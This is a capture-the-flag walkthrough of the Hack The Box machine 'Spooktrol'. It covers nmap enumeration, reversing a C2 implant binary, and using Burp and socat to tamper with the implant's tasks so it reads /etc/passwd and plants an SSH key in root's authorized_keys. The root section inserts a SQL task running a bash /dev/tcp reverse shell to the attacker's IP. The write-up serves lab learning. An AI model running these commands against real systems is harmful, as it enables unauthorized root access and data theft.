# Enumeration

## Nmap

```bash
sudo nmap -sV -sC -oA nmap/spooktrol 10.10.11.123

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open  http    uvicorn
| http-robots.txt: 1 disallowed entry 
|_/file_management/?file=implant
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Wed, 27 Oct 2021 07:30:24 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Wed, 27 Oct 2021 07:30:10 GMT
|     server: uvicorn
|     content-length: 43
|     content-type: application/json
|     Connection: close
|     {"auth":"1f74a681bac81a97711d9316b1da1e68"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Wed, 27 Oct 2021 07:30:17 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 16:77:76:8a:65:a3:db:23:11:21:66:6e:e4:c3:f2:32 (RSA)
|   256 61:92:eb:7a:a9:14:d7:60:51:00:0c:44:21:a2:61:08 (ECDSA)
|_  256 75:c1:96:9c:69:aa:c8:74:ef:4f:72:bd:62:53:e9:4c (ED25519)

```


Three ports

- 22
- 80
- 2222

Downloading binary from `/file_management/?file=implant` as mentioned in robots.txt


```bash
wget 'http://10.10.11.123/file_management/?file=implant'
```

# Foothold

## Implant

On running the binary hit some error regarding `json`


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028162957.png)





Running wireshark 

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164325.png)

we found the domain and need to add to `/etc/hosts` file.

Analyzing binary in ghidra 

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164739.png)

1st flag

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028164912.png)

break at `0x402013` to get 1st flag using `gdb`.

`finish` the function then you will get the flag.

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165356.png)

# User

break at system in upload funtion in case 3

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165651.png)


inorder to acheive case three we can use burpsuite, first we need to interscept at locally the binnary 

change host file as following.

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028165920.png)

Then add a second proxy at burp.

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028170055.png)

Thirdly use socat to redirect port 8081 to port 80

`sudo socat TCP-LISTEN:80,fork,reuseaddr TCP:127.0.0.1:8081`

next use match and replace to change reponse task1 to task3

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028170359.png)

its worked.

```bash

┌[parrot]─[17:03-28/10]─[/home/aju/Hackthebox/machines/spooktrol]
└╼aju$./implant
{"status":0,"id":3,"arg1":"whoami","result":"","target":"1ed93eb3a3e09689276ab2412390db3e","task":3,"arg2":""}
curl: (26) Failed to open/read local data from file/application
{"status":0,"id":3,"arg1":"whoami","result":"","target":"1ed93eb3a3e09689276ab2412390db3e","task":3,"arg2":""}
curl: (26) Failed to open/read local data from file/application


```

It returned as an error beause it is looking for some like we need to find that using gdp. lets break at system.

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028184718.png)

On examine at $rdi we can find that it is looking for file `whoami` lets replace that in burpsuite in `match and replace` into `/etc/passwd`


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028184924.png)


we got replaced in next attempt.

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185028.png)


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185049.png)
Now lets change `/etc/passwd` to our ssh public key


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185303.png)


upload the public to root's authorized_keys

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185412.png)

# Root

Logged in as root in docker.


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185502.png)

![user](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028185502.png)


insert reverse into database task

`INSERT INTO tasks VALUES(13,'10a6dd5dde6094059db4d23d7710ae12',0,1,'bash -c "bash -i >& /dev/tcp/10.10.14.82/9001 0>&1"','',X'726f6f740a');`

![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028190236.png)

Got reverse shell as root


![](https://github.com/alexanderajju/Hackthebox/blob/master/Spooktrol/Pasted%20image%2020211028190141.png)



